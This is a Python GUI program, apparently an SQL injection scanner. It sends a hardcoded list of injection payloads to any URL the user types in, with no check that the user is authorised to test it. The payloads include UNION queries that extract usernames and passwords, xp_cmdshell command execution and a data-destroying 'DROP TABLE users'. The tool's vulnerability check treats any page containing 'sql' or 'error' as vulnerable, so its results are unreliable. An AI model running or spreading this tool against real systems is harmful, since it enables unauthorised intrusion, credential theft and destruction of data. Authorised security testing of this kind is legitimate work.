import tkinter as tk
from tkinter import messagebox, scrolledtext, ttk
import requests
import threading
import re

class SQLiScannerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("SQL Injection Vulnerability Scanner")
        
        # Create a frame for the URL input
        self.url_frame = tk.Frame(root)
        self.url_frame.pack(side=tk.TOP, fill=tk.X, padx=10, pady=10)
        
        # URL input
        self.url_label = tk.Label(self.url_frame, text="Enter URL:")
        self.url_label.pack(side=tk.LEFT, padx=5)
        self.url_entry = tk.Entry(self.url_frame, width=50)
        self.url_entry.pack(side=tk.LEFT, padx=5)
        
        # Scan button
        self.scan_button = tk.Button(self.url_frame, text="Scan for SQLi", command=self.start_scan)
        self.scan_button.pack(side=tk.LEFT, padx=5)
        
        # Progress bar
        self.progress = ttk.Progressbar(root, orient="horizontal", length=300, mode="indeterminate")
        self.progress.pack(pady=10)
        
        # Results display
        self.results_text = scrolledtext.ScrolledText(root, width=60, height=20)
        self.results_text.pack(pady=5, fill=tk.BOTH, expand=True)

        # Expanded list of predefined SQL injection payloads
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' UNION SELECT NULL, username, password FROM users --",
            "' UNION SELECT NULL, database() --",
            "' AND 1=2 UNION SELECT NULL, NULL, NULL --",
            "'; DROP TABLE users; --",
            "'; SELECT * FROM information_schema.tables; --",
            "'; EXEC xp_cmdshell('net user'); --",
            "'; SELECT @@version; --",
            "'; SELECT * FROM users WHERE 'a'='a'; --",
            "'; SELECT * FROM products WHERE price < 100; --",
            "'; IF (1=1) WAITFOR DELAY '0:0:5' --",
            "'; SELECT * FROM information_schema.columns WHERE table_name='users'; --",
            "'; SELECT * FROM information_schema.tables; --",
            "'; SELECT * FROM information_schema.schemata; --",
            "'; SELECT * FROM sys.objects; --",
            "'; SELECT * FROM sys.tables; --",
            "'; SELECT * FROM sys.columns; --",
            "'; SELECT * FROM sys.databases; --",
            "'; EXECUTE IMMEDIATE 'SELECT * FROM users'; --",
            "'; DECLARE @sql NVARCHAR(MAX); SET @sql = 'SELECT * FROM users'; EXEC sp_executesql @sql; --"
        ]

    def is_valid_url(self, url):
        regex = re.compile(
            r'^(?:http|ftp)s?://'  # http:// or https://
            r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # domain...
            r'localhost|'  # localhost...
            r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|'  # ...or ipv4
            r'\[?[A-F0-9]*:[A-F0-9:]+\]?)'  # ...or ipv6
            r'(?::\d+)?'  # optional port
            r'(?:/?|[/?]\S+)$', re.IGNORECASE)
        return re.match(regex, url) is not None

    def start_scan(self):
        url = self.url_entry.get()
        if not url or not self.is_valid_url(url):
            messagebox.showwarning("Input Error", "Please enter a valid URL.")
            return
        
        # Start the scanning in a separate thread
        self.results_text.delete(1.0, tk.END)  # Clear previous results
        self.results_text.insert(tk.END, f"Starting scan for {url}...\n")
        self.progress.start()
        threading.Thread(target=self.scan, args=(url,)).start()

    def scan(self, url):
        try:
            vulnerable_payloads = []
            for payload in self.payloads:
                if self.check_vulnerability(url, payload):
                    vulnerable_payloads.append(payload)

            self.progress.stop()  # Stop the progress bar
            
            # Display results
            if vulnerable_payloads:
                self.results_text.insert(tk.END, "Vulnerable payloads found:\n")
                for payload in vulnerable_payloads:
                    self.results_text.insert(tk.END, f"{payload}\n")
            else:
                self.results_text.insert(tk.END, "No vulnerabilities detected.\n")
        
        except Exception as e:
            self.results_text.insert(tk.END, f"Error: {str(e)}\n")
            self.progress.stop()

    def check_vulnerability(self, url, payload):
        # Construct the test URL with the payload
        test_url = f"{url}?id={payload}"  # Assuming the parameter is 'id'
        try:
            response = requests.get(test_url)
            # Check for common indicators of SQL injection vulnerability
            if "error" in response.text.lower() or "mysql" in response.text.lower() or "sql" in response.text.lower():
                return True
            return False
        except requests.exceptions.RequestException:
            return False

if __name__ == "__main__":
    root = tk.Tk()
    app = SQLiScannerApp(root)
    root.mainloop()
